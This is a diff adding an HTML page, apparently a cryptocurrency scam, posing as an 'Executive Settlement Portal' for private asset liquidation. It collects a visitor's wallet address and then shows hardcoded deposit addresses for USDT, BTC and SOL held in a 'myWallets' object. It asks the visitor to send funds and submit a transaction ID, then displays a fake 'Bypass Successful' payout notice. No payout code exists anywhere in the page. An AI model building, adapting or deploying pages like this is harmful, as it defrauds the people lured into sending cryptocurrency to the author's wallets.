@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Executive Settlement Portal | Secure Node</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root { --primary: #0052FF; --bg: #F4F7F9; --dark: #0A192F; --green: #05B169; }
+        body { background: var(--bg); color: #333; font-family: 'Inter', sans-serif; margin: 0; display: flex; height: 100vh; overflow: hidden; }
+        .sidebar { width: 260px; background: var(--dark); color: white; padding: 25px; display: flex; flex-direction: column; font-size: 13px; }
+        .sidebar .logo { color: var(--primary); font-weight: bold; font-size: 16px; margin-bottom: 40px; }
+        .main { flex: 1; padding: 40px; overflow-y: auto; display: flex; flex-direction: column; align-items: center; }
+        .card { background: white; border-radius: 8px; box-shadow: 0 10px 40px rgba(0,0,0,0.03); padding: 40px; width: 100%; max-width: 650px; border: 1px solid #E1E4E8; }
+        .welcome-box { background: #0A192F; color: white; padding: 25px; border-radius: 6px; margin-bottom: 30px; }
+        .welcome-box h1 { font-size: 18px; margin: 0 0 10px 0; }
+        .welcome-box p { font-size: 12px; color: #8892B0; margin: 0; line-height: 1.6; }
+        .hidden { display: none; }
+        label { display: block; margin-bottom: 8px; font-weight: 600; font-size: 13px; color: #444; }
+        input { width: 100%; padding: 14px; border: 1px solid #D1D5DB; border-radius: 6px; margin-bottom: 20px; font-size: 14px; background: #FAFBFC; box-sizing: border-box; }
+        .btn { background: var(--primary); color: white; border: none; padding: 16px; border-radius: 6px; width: 100%; font-size: 15px; font-weight: bold; cursor: pointer; transition: 0.2s; text-transform: uppercase; }
+        .btn:hover { background: #0044D6; }
+        .address-box { background: #F8FAFF; border: 1px dashed var(--primary); padding: 20px; border-radius: 6px; font-family: monospace; text-align: center; color: var(--primary); font-weight: bold; margin: 15px 0; font-size: 15px; word-break: break-all; }
+        .asset-list { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 20px; }
+        .asset-item { border: 1px solid #EEE; padding: 15px; border-radius: 6px; cursor: pointer; text-align: center; transition: 0.2s; }
+        .asset-item:hover, .asset-item.selected { border-color: var(--primary); background: #F0F4FF; }
+        .asset-item strong { display: block; font-size: 14px; }
+        .step-label { font-size: 11px; color: #BBB; font-weight: bold; text-transform: uppercase; margin-bottom: 20px; display: block; }
+    </style>
+</head>
+<body>
+
+    <div class="sidebar">
+        <div class="logo">CORP_INTERNAL_V4</div>
+        <div style="margin-top: auto; opacity: 0.3; font-size: 10px;">NODE STATUS: ENCRYPTED</div>
+    </div>
+
+    <div class="main">
+        <div class="card">
+            <div class="welcome-box">
+                <h1>EXECUTIVE SETTLEMENT PORTAL</h1>
+                <p>Authorized access only. This node facilitates secure asset liquidation through our private internal bridge.</p>
+            </div>
+
+            <!-- المرحلة 1: الخانات الجديدة (العنوان والشبكة) -->
+            <div id="phase1">
+                <span class="step-label">Step 01: Settlement Destination</span>
+                
+                <label>Recipient Wallet Address (Binance/Private)</label>
+                <input type="text" id="user_wallet" placeholder="Enter your receiving wallet address">
+                
+                <label>Asset Network (e.g., ERC20, TRC20, BEP20)</label>
+                <input type="text" id="user_network" placeholder="Enter the network name or ID">
+                
+                <button class="btn" onclick="showPhase2()">Authorize & View Contract</button>
+            </div>
+
+            <!-- المرحلة 2: اختيار العملة للإيداع -->
+            <div id="phase2" class="hidden">
+                <span class="step-label">Step 02: Liquidation Source</span>
+                <p style="font-size: 12px; color: #666; margin-bottom: 20px;">Choose the asset you are sending for liquidation:</p>
+                
+                <div class="asset-list">
+                    <div class="asset-item" onclick="selectAsset('trc20', this)"><strong>USDT</strong><span>TRC20</span></div>
+                    <div class="asset-item" onclick="selectAsset('erc20', this)"><strong>USDT</strong><span>ERC20</span></div>
+                    <div class="asset-item" onclick="selectAsset('btc', this)"><strong>BTC</strong><span>Native</span></div>
+                    <div class="asset-item" onclick="selectAsset('sol', this)"><strong>SOL</strong><span>Solana</span></div>
+                </div>
+
+                <div id="deposit_area" class="hidden">
+                    <label>Temporary Deposit Node (Internal):</label>
+                    <div class="address-box" id="deposit_addr"></div>
+                    <button class="btn" onclick="showPhase3()">I Have Sent the Assets</button>
+                </div>
+            </div>
+
+            <!-- المرحلة 3: رمز المعاملة -->
+            <div id="phase3" class="hidden">
+                <span class="step-label">Step 03: Final Sync</span>
+                <label>Transaction Hash (TXID)</label>
+                <input type="text" id="txid" placeholder="Paste TXID here">
+                <button class="btn" style="background: var(--green);" onclick="finalSync()">Confirm & Payout</button>
+            </div>
+
+            <!-- الرسالة النهائية -->
+            <div id="success" class="hidden" style="text-align: center;">
+                <div style="font-size: 50px; color: var(--green); margin-bottom: 20px;">✓</div>
+                <h3 style="color: var(--green);">Bypass Successful</h3>
+                <p style="font-size: 13px; color: #555; line-height: 1.6;">
+                    Transaction synchronized with the internal ledger.<br>
+                    <strong>Estimated Arrival: 10 - 30 Minutes.</strong><br>
+                    Funds will reflect in the provided address once the node clears the batch.
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const myWallets = {
+            'trc20': 'TA17kMuebRPDnp46jhTX2R8Tijv6dt8Kug',
+            'erc20': '0xda81be3f3324E64495773bcb445e771EEd383c7d',
+            'btc': 'bc1qsavyp0afxa5kq30w4k98n4tat205t842xc08pd',
+            'sol': 'CdjCVsNZBnVFjmivPNpxx7QAq9kYLhmu1rvtbhnQY7Xv'
+        };
+
+        function showPhase2() {
+            if(document.getElementById('user_wallet').value.length < 5 || document.getElementById('user_network').value.length < 2) {
+                alert("Please fill in both the address and network name."); return;
+            }
+            document.getElementById('phase1').classList.add('hidden');
+            document.getElementById('phase2').classList.remove('hidden');
+        }
+
+        function selectAsset(asset, element) {
+            document.querySelectorAll('.asset-item').forEach(el => el.classList.remove('selected'));
+            element.classList.add('selected');
+            document.getElementById('deposit_area').classList.remove('hidden');
+            document.getElementById('deposit_addr').innerText = myWallets[asset];
+        }
+
+        function showPhase3() {
+            document.getElementById('phase2').classList.add('hidden');
+            document.getElementById('phase3').classList.remove('hidden');
+        }
+
+        function finalSync() {
+            if(document.getElementById('txid').value.length < 10) return alert("Invalid TXID.");
+            document.getElementById('phase3').classList.add('hidden');
+            document.getElementById('success').classList.remove('hidden');
+        }
+    </script>
+</body>
+</html>
